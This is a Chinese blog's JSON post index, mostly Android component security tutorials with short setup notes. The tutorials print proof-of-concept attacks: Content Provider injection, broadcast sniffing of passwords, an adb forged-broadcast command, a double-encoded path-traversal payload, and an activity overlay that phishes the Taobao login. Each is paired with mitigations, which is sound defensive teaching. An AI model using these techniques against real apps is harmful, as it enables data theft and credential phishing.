[{"title":"accident","url":"/post/2402409327.html","content":"\n[克莱因瓶](https://baike.baidu.com/item/%E5%85%8B%E8%8E%B1%E5%9B%A0%E7%93%B6/1187845?fr=aladdin) \n\n[彭罗斯阶梯](https://baike.baidu.com/item/%E5%BD%AD%E7%BD%97%E6%96%AF%E9%98%B6%E6%A2%AF/10124603?fr=aladdin&fromtitle=%E6%BD%98%E6%B4%9B%E6%96%AF%E9%98%B6%E6%A2%AF&fromid=935543)  \n\n[莫比乌斯带](https://baike.baidu.com/item/%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%B8%A6/4457881?fr=aladdin)   \n\n[祖母悖论](https://baike.baidu.com/item/%E5%A4%96%E7%A5%96%E6%AF%8D%E6%82%96%E8%AE%BA/8027613?fr=aladdin&fromid=1816917&fromtitle=%E7%A5%96%E6%AF%8D%E6%82%96%E8%AE%BA)  \n\n[拟合曲线](https://baike.baidu.com/item/%E6%8B%9F%E5%90%88%E6%9B%B2%E7%BA%BF/15093587?fr=aladdin)\n\n[弦理论](https://baike.baidu.com/item/%E5%BC%A6%E7%90%86%E8%AE%BA?fromtitle=%E8%B6%85%E5%BC%A6%E7%90%86%E8%AE%BA&fromid=340146)  \n\n[关于两个系统的对话](https://wenku.baidu.com/view/823657f405087632311212be.html)\n\n[费米悖论](https://baike.baidu.com/item/%E8%B4%B9%E7%B1%B3%E6%82%96%E8%AE%BA/10937023?fr=aladdin)  \n\n[停机问题](https://baike.baidu.com/item/%E5%81%9C%E6%9C%BA%E9%97%AE%E9%A2%98/4131067?fr=aladdin)  \n\n[离散傅里叶变换](https://baike.baidu.com/item/%E7%A6%BB%E6%95%A3%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/6379901)  \n\n密码朋克  \n\n石墨烯技术  \n\n幂定律  \n\n[欢喜佛]\n\n[如是观]()\n如是观，见《金刚经》结尾“一切有为法，如梦幻泡影。如露亦如电，应作如是观。”意思是说，佛教徒应持这样的观点：所有事物现象，都是空幻的，生灭无常的。“如是”是指示代词，犹言如此，是这样。在佛经中，“如是”往往特指佛说的教义。过去注经者或谓当理为“如”，无非为“是”；或谓“真空”为“如”，“妙有”为“是”。文章中引用如鲁迅《而已集·大衍发微》：“将冠冕堂皇的‘整顿学风’的盛举，只作如是观，虽然大煞风景，对不住‘正人君子’们，然而我的眼光这样，也就无法可想。”   \n\n\n\n\n","tags":["accident"],"categories":["biu"]},{"title":"android逆向工具","url":"/post/1200045731.html","content":"\n\n","tags":["android安全","android逆向"],"categories":["android安全"]},{"title":"android分析环境bymacos","url":"/post/567729331.html","content":"\n# 下载jdk配置环境变量\n\n[jdk-down](https://www.oracle.com/technetwork/java/javase/downloads/index.html)  \n\n## 环境变量\n\t\n\tvim ~/.bash_profile\n\tvim ~/.zshrc //要是使用zsh就编辑zshrc\n\n\tJAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_131.jdk/Contents/Home\n\texport JAVA_HOME\n\texport PATH=$JAVA_HOME/bin:$PATH\n\tsource ~/.bash_profile\n\n\tsource ~/.zshrc\n\n\tjava -version\n\n\n\n","tags":["android安全"],"categories":["android安全"]},{"title":"hexo_config","url":"/post/1144770046.html","content":"\n## 前言：\n\n为什么要用hexo，首先是因为gitalk 出现了一个Error: Validation Failed.问题，具体原因是gitalk 的id 有50个字符的限制，因为是用的pathname，然后pathname长度超了，然后去网上搜索问题，发现有的解决方法是要改成site.title,但是我有部分文章的title也是超长的，然后这个问题一直搁置了，后来我看到了一个hexo的持久化链接的文章，可以随机生成一个字符串作为持久化链接，是通过一个hexo-abbrlink的一个插件，我搜索了一下发现jekyll并没有这个插件，然后还发现了一些hexo的一些其他插件很好用，如hexo-admin，恩，就打算迁移到hexo。  \n\n## hexo 初始化\n\n在使用hexo之前你需要安装nodejs  \n\n[nodejs官网](https://nodejs.org/en/)  \n[hexo官网](https://hexo.io/zh-cn/)  \n\n安装nodejs之后安装hexo  \n\n\tnpm install hexo-cli -g\n\thexo init blog\n\tcd blog\n\tnpm install\n\thexo server\n\n## hexo 主题\n\n[hexo theme](https://hexo.io/themes/)  \n\n或者在github 上搜索 hexo theme找到你喜欢的主题  \n\n这个是一个我比较喜欢的主题  \n[aircloud github](https://github.com/aircloud/hexo-theme-aircloud)  \n[aircloud](http://niexiaotao.cn/)  \n\n\t切换到博客目录\n\tmkdir themes/aircloud\n\tgit clone https://github.com/aircloud/hexo-theme-aircloud.git themes/aircloud/\n\n\taircloud 搜索功能\n\tnpm i hexo-generator-search --save\n\t添加_config.yml\n\tsearch:\n\t  path: search.json\n\t  field: post\n\n\t修改_config.yml theme\n\ttheme: aircloud\n\n其他的一些配置参照[aircloud readme](https://github.com/aircloud/hexo-theme-aircloud/blob/master/readme.md)  \n\n然后修改了一些地方，包括配置，头像，评论，文章之类的  \n\n## jekyll命令\n\n\thexo new <title>\n\thexo generate 生成静态文件\n\thexo clean 清理\n\thexo publish <title> 草稿移动到 source/_posts (没有试过\n\thexo server\n\thexo deploy 部署到网站\n\thexo new page tags \n\n## jekyll to hexo \n\n因为我之前的博客是jekyll 来的 迁移到hexo 有一些问题或者差异然后记录下  \n\n## other hexo \n\n另外一些hexo的配置\n","tags":["hexo"],"categories":["hexo"]},{"title":"android Content Provider漏洞挖掘","url":"/post/758430476.html","content":"\n## Content Provider安全场景和危害\n\n在Android系统中，Content Provider作为应用程序四大组件之一，它起到在应用程序之间共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现。  \n然而有些数据是应用自己的核心数据，需要有保护地进行开放。  \n虽然Binder进程间通信机制突破了以应用程序为边界的权限控制，但是它是安全可控的，因为数据的访问接口是由数据的所有者来提供的，就是数据提供方可以在接口层来实现安全控制，决定哪些数据是可以读，哪些数据可以写。  \n很多开发者不能恰当的使用，导致攻击者可访问到应用本身不想共享的数据。虽然Content Provider组件本身也提供了读写权限控制，但是它的控制粒度是比较粗的。  \n\n## Content Provider漏洞分类\n\n- 信息泄漏\n- SQL注入\n- 目录遍历\n\n## 信息泄露漏洞\n\ncontent URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个，provider中的一个表，指向表的contentURI是参数之一，如果对Content Provider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。  \n\n\n\t<provider android:name=\".providers.YouNiProvider\" android:process=\"com.snda.youni.mms\" android:authorities=\"com.snda.youni.providers.DataStructs\"/>\n\n\tprivate void getyouni(){\n\t\tint i = 0;\n\t\tContentResolver contentresolver=getContentResolver();\n\t\tString[] projection={\"* from contacts--\"};\n\t\tUri uri =Uri.parse(\"content://com.snda.youni.providers.DataStructs/message_ex\");\n\t\tCursor cursor=contentresolver.query(uri.projection,null,null,null);\n\t\tString text=\"\";\n\t\twhile(cursor.moveToNext()){\n\t\t\ttext+=cursor.getString(cursor.getColumnIndex(\"display_name\"))+\"\\n\";\n\t\t}\n\t\tLog.i(\"TEST\",text);\n\t}\n\n## 信息泄漏漏洞 防护\n\n1.minSdkVersion不低于9  \n2.不向外部app提供数据的私有content provider显示设置exported=\"false\"，避免组件暴露(编译api小于17时更应注意此点)  \n3.内部app通过content provid交换数据时，设置protectionLevel=\"signature\"验证签名  \n4.公开的content provider确保不存储敏感数据  \n\n针对权限保护绕过防御措施：  \n1.使用Context.checkCallingPermission()和Context.enforceCallingPermission()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。  \n2.可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。  \n\n\n\tpublic void definedPermissionsSecurityOk(Context con){\n\t\tPackageManager pm =con.getPackageManager();\n\t\ttry{\n\t\t\tPackageInfo myPackageInfo=pm.getPackageInfo(con.getPackageName(),PackageManager.GET_PERMISSIONS);\n\t\t\tPermissionInfo[] definedPermissions=myPackageInfo.permissions;\n\t\t\tfor(int i=0;i<definedPermissions.length;i++){\n\t\t\t\tint protLevelReportedBySystem = pm.getPermissionInfo(definedPermissions[i].name,0).protectionLevel;\n\t\t\t\tif(definedPermissions[i].protectionLevel!=protLevelReportedBySystem){\n\t\t\t\t\tthrow new SecurityException(\"protectionLevel mismatch for\"+definedPermissions[i].name);\n\t\t\t\t}\n\t\t\t}\n\t\t}catch(NameNotFoundException e){\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\n## SQL注入漏洞\n\n对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能导致sql注入攻击。  \n所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。  \n应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。  \n另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。  \n预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。  \n\n\tINSERT VALUES INTO [table name](?,?,?,?...)\n\n## SQL注入漏洞 防护\n\n1.实现健壮的服务端校验  \n2.使用参数化查询语句，比如SQLiteStatement。  \n3.避免使用rawQuery()。  \n4.过滤用户的输入。  \n\n## 目录遍历漏洞\n\n使用ContentProvider.openFile()可以实现应用间共享数据，如果这个方法使用不当将会导致目录遍历漏洞。因此在使用Content Provider实现数据交换时，应该对传递的路径进行过滤。  \n\n\tprivate static String IMAGE_DIRECTORY=localFile.getAbsolutePath();\n\tpublic ParcelFileDescriptor openFile(Uri paramUri,String paramString);\n\tthrows FileNotFoundException{\n\t\tFile file=new File(IMAGE_DIRECTORY,paramUri.getLastPathSegment());\n\t\treturn ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);\n\t}\n这段代码使用android.net.Uri.getLastPathSegment()从paramUri中获取文件名，然后将其放置在预定义好的目录IMAGE_DIRECTORY中，如果该URL是encoded编码后的，那么将可能导致目录遍历漏洞。  \nAndroid4.3开始，Uri.getLastPathSegment()内部实现调用Uri.getPathSegments()。  \n\n\tpublic String getLastPathSegment(){\n\t\tList<String> segments=getPathSegments();\n\t\tint size=segments.size();\n\t\tif(size==0){\n\t\t\treturn null;\n\t\t}\n\t\treturn segments.get(size-1);\n\t}\n\n\n\tUri.getPathSegments()部分代码片段：  \n\tPathSegments getPathSegments(){\n\t\tif(pathSegments!=null){\n\t\t\treturn pathSegments;\n\t\t}\n\t\tString path = getEncoded();\n\t\tif(path==null){\n\t\t\treturn pathSegments = PathSegments.EMPTY;\n\t\t}\n\t\tPathSegmentsBuilder segmentBuilder=new PathSegmentsBuilder();\n\t\tint previous =0;\n\t\tint current;\n\t\twhile((current=path.indexOf('/',previous))>-1){\n\t\t\tif(previous<current){\n\t\t\t\tString decodedSegment=decode(path.substring(previous,current));\n\t\t\t\tsegmentBuilder.add(decodedSegment);\n\t\t\t}\n\t\t\tprevious=current+1;\n\t\t}\n\t\tif(previous<path.length()){\n\t\t\tsegmentBuilder.add(decode(path.substring(preyious)));\n\t\t}\n\t\treturn pathSegments=segmentBuilder.build();\n\t}\n\nUri.getPathSegments首先会通过getEncoded()获取一个路径，然后以\"/\"为分隔符将path分成片段，最后调用decode()方法解码。  \n了解了函数内部处理流程，那么假使我们传递一个encoded编码后的url给getLastPathSegment()，编码后的分隔符就变成了%2F,绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是API设计方面的问题，直接导致了目录遍历漏洞。  \n\n为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给getLastPathSegment()之前解码。  \n有的开发者了解上面描述这种漏洞代码，采用调用两次getLastPathSegment()方法的方式，第一次调用是为了解码，第二次调用期望得到正确的值。  \n\n\tprivate static String IMAGE_DIRECTORY=localFile.getAbsolutePath();\n\t\tpublic ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws FileNotFoundException{\n\t\t\tFile file=new File(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());\n\t\t\treturn ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);\n\t\t}\n\n\t这个编码后的URL： ..%2F..%2F..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml   \n\t第一次调用getLastPathSegment()，会返回../../../data/data/com.example.android.app/shared_prefs/Example.xml。   \n\t第二次调用getLastPathSegment()会返回Example.xml  \n\n\n\t然而攻击者可以采用一种叫做\"Double Encoding\"的技术，使得第一次调用getLastPathSegment()后无法解码。 \n\n\t比如下面经过double encoded后的string就可以绕过上面这种防御\n\n\t%252E%252E%252F%252E%252E%252F%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml \n\n\t第一次解码后： %2E%2E%2F%2E%2E%2F%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml\n\n\t第二次解码后： ../../../data/data/com.example.android.app/shared_prefs/Example.xml \n\n\t仍会导致目录遍历。所以简单的解码后再传人也是不够的，仍然需要严格校验以确保path是期望的路径。\n\n## 目录遍历漏洞：防护\n\n首先对paramUri解码，文件创建后再通过调用File.getCanonicalPath()来对path的格式进行规范化，最后校验其是否在预定义的目录IMAGE_DIRECTORY。  \nFile.getCanonicalPath()函数实现是这样的，它会将path规范化，得到一个唯一的绝对路径。这通常涉及到从路径名中移除多余的名称(比如\".\"和\"..\")、分析符号连接(对于UNIX平台),以及将驱动器名称转换成标准大小写形式(对于Microsoft Windows平台)。  \n\n\n\tprivate static String IMAGE_DIRECTORY=localFile.getAbsolutePath();\n\tpublic ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws FileNotFoundException{\n\t\tString decodedUriString = Uri.decode(paramUri.toString());\n\t\tFile file=new File(IMAGE_DIRECTORY,Uri.parse(decodedUriString).getLastPathSegment());\n\t\tif(file.getCanonicalPath().indexOf(localFile.getCanonnicalPath())!=0){\n\t\t\tthrow new IllegalArgumentException();\n\t\t}\n\t\treturn ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);\n\t}\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/29/01.jpg)\n","tags":["android安全"],"categories":["android安全"]},{"title":"android Broadcast Receiver漏洞挖掘","url":"/post/962818054.html","content":"\n## Broadcast Receiver安全场景和危害\n\nBroadcastReceiver是Android的四大组件之一，这个组件涉及两个概念：广播发送者和广播接受者。  \n这里的广播实际上指的就是intent。  \n当发送一个广播时，系统会将发送的广播(intent)与系统中所有注册的符合条件的接收者的IntentFilter进行匹配，若匹配成功，则执行相应接收者的onReceive函数。  \n发送广播时如果处理不当，恶意应用便可以嗅探、拦截广播，致使敏感数据泄露等；如果接收广播时处理不当，便可导致拒绝服务攻击、伪造消息、越权操作等。  \n\n## Broadcast Receiver漏洞分类\n\n- 敏感信息泄露\n- 权限绕过\n- 消息伪造\n- 拒绝服务\n\n## 敏感信息泄漏漏洞\n\n发送的intent没有明确指定接收者，而是简单的通过action进行匹配。恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播里存在敏感数据，就被恶意应用窃取了。  \n\n隐式意图发送敏感信息：  \n\n\tprivate void d() {\n\t\tIntent v1 = new Intent();\n\t\tv1.setAction(\"com.sample.action.server_running\");\n\t\tv1.putExtra(\"local_ip\",v0.h);\n\t\tv1.putExtra(\"port\",v0.i);\n\t\tv1.putExtra(\"code\",v0.g);\n\t\tv1.putExtra(\"connected\",v0.s);\n\t\tv1.putExtra(\"pwd_predefined\",v0.r);\n\t\tif(!TextUtils.isEmpty(v0.t)){\n\t\t\tv1.putExtra(\"connected_usr\",v0.t);\n\t\t}\n\t\tsendBroadcast(v1);\n\t}\n\nPOC:  \n\n\tpublic void onReceive(Context context,Intent intent){\n\t\tString s = null;\n\t\tif(intent.getACtion().equals(\"com.sample.action.server_running\")){\n\t\t\tString pwd=intent.getStringExtra(\"connected\");\n\t\t\ts=\"Airdroid => [\"+pwd+\"]/\"+intent.getExtras();\n\t\t}\n\t\tToast.makeTest(context,String.format(\"%sReceived\",s),Toast.LENGTH_SHORT).show();\n\t}\n\n## 敏感信息泄露漏洞：修复\n\n修复后代码，使用LocalBroadcastManager.sendBroadcast()发出的广播只能被app自身广播接收器接收。  \n\n\tIntent intent = new Intent(\"my-sensitive-event\");\n\tintent.putExtra(\"event\",\"this is a test event\");\n\tLocalBroadcastManager.getInstance(this).sendBroadcast(intent);\n\n## 权限绕过漏洞\n\n可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过<receiver>标签静态注册。另外一种是通过Context.registerReceiver()动态注册,指定相应的intentFilter参数。然而动态注册的广播默认是导出的。如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等。  \n\n程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的。  \n\ncode：  \n\n\tandroid.intent.action.PACKAGE_FULLY_REMOVED\n\n漏洞证明：  \n\n\t简单测试方法用adb shell 发送广播\n\ncode区域：  \n\n\tam broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d package:com.wumii.android.mimi\n\n## 权限绕过漏洞：修复\n\n推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势。  \n\n1.不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。  \n2.不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。  \n3.它比系统的全局广播更高效。  \n\n## 消息伪造\n\n\t暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输的，被调用的Receiver接收有可能产生安全隐患。  \n\n\tIntent i= new Intent();\n\ti.setAction(\"com.baidu.android.oushservice.action.MESSAGE\");\n\tBundle b = new Bundle();\n\tJSONObject jsobject = new JSONObject();\n\tJSONObject custom_content_js = new JSONObject();\n\tjsobject.put(\"title\",\"百度云盘【漏洞你中奖了!】\");\n\n\tjsobject.put(\"descrption\",\"\");\n\n\t//jsobject.put(\"url\",\"http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk\");\n\tJSONObject customcontent_js = new JSONObject();\n\tcustomcontent_js.put(\"type\",\"1\");\n\tcustomcontent_js.put(\"msg_type\",\"resources_push\");\n\n## 消息伪造 防护\n\n\t设置为签名验证\n\tandroid:protectionLevel=\"signature\"\n\n\t<receiver android:name=\"com.umeng.message.UmengMessageBootReceiver\" android:protectionLevel=\"signature\">\n\t\t<intent-filter>\n\t\t\t<action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\n\t\t</intent-filter>\n\t</receiver>\n\n## 拒绝服务\n\n如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。  \n\n拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。  \n\n## 拒绝服务 防护\n\n- 空指针异常\n- 类型转换异常\n- 数组越界访问异常\n- 类未定义异常\n- 其他异常\n\n\t//Serializable：\n\tIntent i = this.getIntent();\n\tif(i.getAction().equals(\"serializable_action\")){\n\t\ti.getSerializableExtra(\"serializable_key\");//未做异常判断\n\t}\n\t//Parcelable:\n\tthis.b=(RouterConfig)this.getIntent().getParcelableExtra(\"filed_router_config\");//引发转型异常崩溃\n\n谨慎处理接收的intent以及其携带的信息。  \n对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。  \n\n## Broadcast安全防护\n\n- 私有广播接收器设置exported='false',并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。\n- 对接收来的广播进行验证。\n- 内部app之间的广播使用protectionLevel='signature' 验证其是否真是内部app。\n- 返回结果时需注意接收app是否会泄露信息。 \n- 发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。\n- 使用LocalBroadcastManager。","tags":["android安全"],"categories":["android安全"]},{"title":"android Activity漏洞挖掘","url":"/post/2470166639.html","content":"\n## 越权绕过漏洞\n\t\n在Android系统中，Activity默认是不导出的，如果设置了 ```exported=\"true\"``` 这样的关键值或者是添加了```<intent-filter>```这样的属性，并且没有显示的设置为```exported=\"false\"```,那么此时Activity是导出的，如果Activity被不合理的导出，那么就会有越权绕过或者是泄漏敏感信息等安全风险，比如在业务过程中会有一些敏感的界面是需要用户输入密码才能查看的，但是如果没有对调起此activity的组件进行权限验证，那么就会造成验证的越权问题，导致恶意的攻击者不需要输入密码等信息也可以打开这个界面。还有通过Intent给Activity传输畸形数据使得程序崩溃拒绝服务影响用户体验或Activity界面被劫持产生欺诈等安全事件。  \n\n## 利用\n\n\t1.启动 通过启动主界面子界面，在返回即可进入主界面。\n\t2.启动设置本地的密码的activity，可重置本地密码。\n\n## 防护\n\t\n\t私有Activity，不应被其他应用启动相对是安全的，设置exported属性为false\n\n\t公开暴露的Activity，可以被任意应用启动：\n\t1.设置exported属性为true\n\t2.谨慎处理接收的intent\n\t3.有返回数据时不应包含敏感信息\n\t4.不应发送敏感信息\n\t5.当收到返回数据时谨慎处理\n\n## 组件导出导致钓鱼欺诈\n\n\tAndroid为了提高用户的用户体验，对于不同的应用程序之间的切换，基本上是无缝。他们切换的只是一个activity，让切换的到前台显示，另一个应用则被覆盖到后台，不可见。Activity的概念相当于一个与用户交互的界面。  \n\t而Activity的调度是交由Android系统中的AMS管理的。AMS即ActivityManagerService(Activity管理服务),各个应用想启动或停止一个进程，都是先报告给AMS。  \n\t当AMS收到要启动或停止Activity的消息时，它先更新内部记录，在通知相应的进程运行或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity都保留在系统中年的Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。  \n\t当用户按下back键时，顶部Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。  \n\t由于Activity的这种特性，如果在启动一个Activity时，给它加入一个标志位FLAGACTIVITYNEW_TASK,就能使它置于栈顶并立马呈现给用户。  \n\t如果这个Activity是用于盗号的伪装Activity，那么就会产生钓鱼安全事件或者是一个Activity中有webview加载，如果允许加载任意网页也有可能会产生钓鱼事件。  \n\n---\n\n\tpublic class LockTask extends TimerTask{\n\t\tpublic static final String TAG=\"LockTask\";\n\t\tprivate Context mContext;\n\t\tString testPackageName=\"com.taobao.taobao\";\n\t\tString testClassName=\"com.taobao.tao.LoginActivity\";\n\n\t\tprivate ActivityManager mActivityManager;\n\n\t\tpublic LockTask(Context context){\n\t\t\tmContext=context;\n\t\t\tmActivityManager=(ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);\n\t\t}\n\n\t\t@Override\n\t\tpublic void run(){\n\t\t\tComponentName topActivity=mActivityManager.getRunningTasks(1).get(0).topActivity;\n\t\t\tString packageName = topActivity.getPackageName();\n\t\t\tString className = topActivity.getClassName();\n\t\t\tLog.v(TAG,\"packageName\"+packageName);\n\t\t\tLog.v(TAG,\"className\"+className);\n\n\t\t\tif(testPackageName.equals(packageName)&&testClassName.equals(className)){\n\t\t\t\tIntent intent = new Intent();\n\t\t\t\tintent.setClassName(\"com.example.locktest\",\"com.example.locktest.PasswordActivity\");\n\t\t\t\tintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\t\t\t\tmContext.startActivity(intent);\n\t\t\t}\n\t\t}\n\t}\n\n## 组件导出导致钓鱼欺诈：防护\n\n\t//在停止的时候提示\n\tprotected void onStop(){\n\t\tsuper.onStop();\n\t\tContext context=getApplicationContext();\n\t\tToast toast=Toast.makeText(getApplicationContext(),\"程序进入后台\",Toast.LENGTH_SHORT);\n\t\ttoast.show();\n\t}\n\n\t不指定taskAffinity task管理activity。task的名字取决于根activity的affinity。默认设置中Activity使用包名做为affinity。task由app分配，所以一个应用的Activty在默认情况下属于相同task。跨task启动Activity的intent有可能被其他app读取到；不指定lunchMode默认standard，建议使用默认。创建新task时有可能被其他应用读取intent的内容。\n\n\t如果当前的程序进入后台那么进行Notification提示用户进程已经进进入后台运行，并且如果有必要可以设置清除通知时候不允许这个通知被清除掉。  \n\n## 隐式启动intent包含敏感数据\n没看懂\n\n## 拒绝服务\n\n\tAndroid系统提供了Intent机制来协助应用间的交互与通讯，Intent负责对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android系统则根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。Android应用本地拒绝服务漏洞源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，\n\n\t简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用，导致其崩溃。本地拒绝服务漏洞不仅可以导致安全防护等应用的防护功能被绕过或失效(如杀毒应用、安全卫士、防盗锁屏等)，而且也可被竞争方应用利用来攻击，使得自己的应用崩溃，造成不同程度的经济利益损失。  \n\n\t危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的。  \n\n## 拒绝服务：防护\n\t\n- 空指针异常\n- 类型转换异常\n- 数组越界访问异常\n- 类未定义异常\n- 其他异常\n\n---\n\n\t//Serializable:\n\tIntent i = this.getIntent();\n\tif(i.getAction().equals(\"serializable_action\")){\n\t\ti.getSerializableExtra(\"serializable_key\");//未做异常判断\n\t}\n\t//Parcelable:\n\tthis.b=(RouterConfig)this.getIntent().getParcelableExtra(\"filed_router_config\");//引发转型异常崩溃\n\n\t谨慎处理接收的intent以及其携带的信息。  \n\t对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。  \n","tags":["android安全"],"categories":["android安全"]},{"title":"android Service漏洞挖掘","url":"/post/3182197634.html","content":"\n## Service安全场景和危害\n\n\tService是android四大组件之一，一个Service是没有界面且能长时间运行于后台的应用组件。其他应用的组件可以启动一个服务运行于后台，即使用户切换到另一个应用也会继续运行。另外，一个组件可以绑定到一个service来进行交互，即使这个交互是进程间通讯也没问题。例如，一个service可能处理网络事物，播放音乐，执行文件I/O，或与一个内容提供者交互，所有这些都在后台进行。Service不是分离开的进程，除非其他特殊情况，他不会运行在自己的进程，而是作为启动运行它的进程的一部分。Service不是线程，这意味着它将在主线程里劳作。  \n\n\t如果一个导出的Service没有做严格的限制，任何应用可以去启动并且绑定到这个Service上，取决于被暴露的功能，这有可能使得一个应用去执行未授权的行为，获取敏感信息或者是污染修改内部应用的状态造成威胁。  \n\n## Service漏洞分类\n\n- 权限提升\n- services劫持\n- 消息伪造\n- 拒绝服务\n\n## 权限提升漏洞\n\n\t当一个service配置了intent-filter默认是被导出的，如果没对调用这个Service进行权限限制或者是没有对调用者的身份进行有效的验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意的行为发生比如说调用具有system权限的删除卸载服务删除卸载其他应用。\n\n## service劫持\n\n\t攻击原理：隐式启动service，当存在同名service，先安装应用的service优先级高。  \n## 消息伪造\n\n\t暴露的Service对外接收Intent，如果构造恶意的消息放到Intent中传输，被调用的Service接收有可能产生安全隐患。  \n\n\t如：指定升级下载的URL地址，可导致任意应用安装！  \n\n## 消息伪造\n\n\tprotected void onHandleIntent(Intent intent){\n\t\tIntent v0;\n\t\tString v23;\n\t\tSerializable pushMsg=intent.getSerializableExtra(\"PushMsg\");\n\t\t...\n\t\tAppVersionManager.getInstance(Youku.context).showAPpAgreementDialog();\n\n\t\tswitch(pushMsg.type){\n\t\t\tcase 1:{\n\t\t\t\tgoto label_53;\n\n\t\t\t}\n\t\t}\n\t}\n\n\tlabel_53:\n\t\tintent.setFlags(876609536);\n\t\tintent.setClass(this,UpdateActivity.class);\n\t\tintent.putExtra(\"updateurl\",pushMsg.updateurl);\n\t\tintent.putExtra(\"updateversion\",pushMsg.updateversion);\n\t\tintent.putExtra(\"updatecontent\",pushMsg.updatecontent);\n\t\tintent.putExtra(\"updateType\",2);\n\t\tthis.startActivity(intent);\n\t\treturn;\n\n## 拒绝服务\n\tService的拒绝服务主要是来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致的程序崩溃。主要体现的方面如给Service传输未null的intent或者是传输序列化对象导致接收时候的类型转化异常。  \n\n修复：  \n1.改成service exported false\n2.删除多余测试代码，验证token\n\n## 拒绝服务：防护\n\n- 空指针异常\n- 类型转换异常\n- 数组越界访问异常\n- 类未定义异常\n- 其他异常\n\n\t//Serializable:\n\tIntent i = this.getIntent();\n\tif(i.getAction().equals(\"serializable_action\")){\n\ti.getSerializableExtra(\"serializable_key\");//未做异常判断\n\t}\n\t//Parcelable:\n\tthis.b=(RouterConfig)this.getIntent().getParcelableExtra(\"filed_router_config\");//引发转型异常崩溃\n\n\t谨慎处理接收的intent以及其携带的信息。\n\t对接收到的任何数据try catch处理，以及对不符合预期的数据做异常处理。  \n\n## Service安全防护\n\n- 私有service不定义intent-filter并且设置exported为false。\n- 公开的service设置exported为true，intent-filter可以定义或者不定义。\n- 合作service需对合作方的app签名做校验。\n- 只被应用本身使用的service应设置为私有。\n- service接收到的数据需谨慎处理。\n- 内部service需使用签名级别的protectionLevel来判断是否为内部应用调用。\n- 不应在service创建(onCreate方法被调用)的时候决定是否提供服务,应在onStartCommand/onBind/onHandleIntent等方法被调用的时候做判断。\n- 当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险。\n- 有明确的服务需调用时使用显示意图。\n- 尽量不发送敏感信息。\n- 